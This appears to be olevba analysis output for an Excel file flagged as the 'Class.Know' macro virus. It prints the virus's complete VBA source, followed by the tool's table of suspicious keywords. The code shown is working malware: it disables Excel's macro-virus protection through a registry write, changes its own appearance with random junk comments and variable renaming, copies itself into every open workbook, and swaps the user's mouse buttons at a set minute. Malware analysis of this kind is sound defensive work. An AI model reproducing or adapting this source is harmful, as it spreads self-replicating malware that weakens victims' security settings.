olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Know-032b99174d54c8b0d874098bba69fa590c63acf1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO DieseArbeitsmappe.cls 
in file: Virus.MSExcel.Know-032b99174d54c8b0d874098bba69fa590c63acf1 - OLE stream: '_VBA_PROJECT_CUR/VBA/DieseArbeitsmappe'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long '
Private Sub Workbook_Deactivate() '
On Error Resume Next: Dim Virus(200) '
Set obj = CreateObject("word.application"): obj.system.privateprofilestring("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: obj.Quit '
Const hostname = "DieseArbeitsmappe" '
Set host = ActiveWorkbook.VBProject.VBComponents(hostname).CodeModule '
OurLines = host.CountOfLines: PiESize = 100 + Int(Rnd * 50): PiEChar = Chr(39) '
For ix = 1 To OurLines: JunkCode = "": PiERnd = Int(Rnd * 3): PiEPos = InStr(host.Lines(ix, 1), PiEChar) '
If PiEPos = 1 And OurLines > PiESize Then PiERnd = 1: GoTo next_ '
Virus(ix) = Left(host.Lines(ix, 1), (PiEPos - 1)) '
For jx = 1 To Int(75 - (Rnd * 20)): JunkCode = JunkCode & Chr(255 - Int(Rnd * 100)): Next '
Virus(ix) = Virus(ix) & PiEChar & JunkCode '
If PiERnd = 2 Then Virus(ix) = Virus(ix) & vbCr & PiEChar & JunkCode '
FullCode = FullCode & Virus(ix) & vbCr '
next_: Next '
Dim VARIABLE(1 To 20) '
VARIABLE(1) = "Virus": VARIABLE(2) = "obj": VARIABLE(3) = "hostname": VARIABLE(4) = "host": VARIABLE(5) = "OurLines": VARIABLE(6) = "PiESize": VARIABLE(7) = "PiEChar": VARIABLE(8) = "ix" '
VARIABLE(9) = "JunkCode": VARIABLE(10) = "PiERnd": VARIABLE(11) = "PiEPos": VARIABLE(12) = "next_": VARIABLE(13) = "jx": VARIABLE(14) = "FullCode": VARIABLE(15) = "VARIABLE": VARIABLE(16) = "OUR_LOOP" '
VARIABLE(17) = "NEW_VAR": VARIABLE(18) = "VAR_POSITION": VARIABLE(19) = "NEXT_LINE": VARIABLE(20) = "target" '
For OUR_LOOP = 1 To 20 '
NEW_VAR = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 999) '
VAR_POSITION = 1 '
NEXT_LINE: VAR_POSITION = InStr(VAR_POSITION, FullCode, VARIABLE(OUR_LOOP)) '
If VAR_POSITION <> 0 Then FullCode = Mid(FullCode, 1, (VAR_POSITION - 1)) & NEW_VAR & Mid(FullCode, (VAR_POSITION + Len(VARIABLE(OUR_LOOP))), Len(FullCode)): GoTo NEXT_LINE '
Next '
For Each target In Workbooks '
If target.VBProject.VBComponents(hostname).CodeModule.CountOfLines < 2 Then target.VBProject.VBComponents(hostname).CodeModule.AddFromString FullCode '
Next '
If Minute(Now()) = 23 Then MsgBox "know, you never think you know why", 0, "Class.Know by jackie twoflower /Lz0NT /MVT /CC": SwapMouseButton &H2 '
End Sub '
Rem Class.Know written by jackie twoflower /Lz0NT /MVT /CC '
Rem Uses PiE v2.0 for VBA '
-------------------------------------------------------------------------------
VBA MACRO Tabelle1.cls 
in file: Virus.MSExcel.Know-032b99174d54c8b0d874098bba69fa590c63acf1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle2.cls 
in file: Virus.MSExcel.Know-032b99174d54c8b0d874098bba69fa590c63acf1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Tabelle3.cls 
in file: Virus.MSExcel.Know-032b99174d54c8b0d874098bba69fa590c63acf1 - OLE stream: '_VBA_PROJECT_CUR/VBA/Tabelle3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tabelle
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

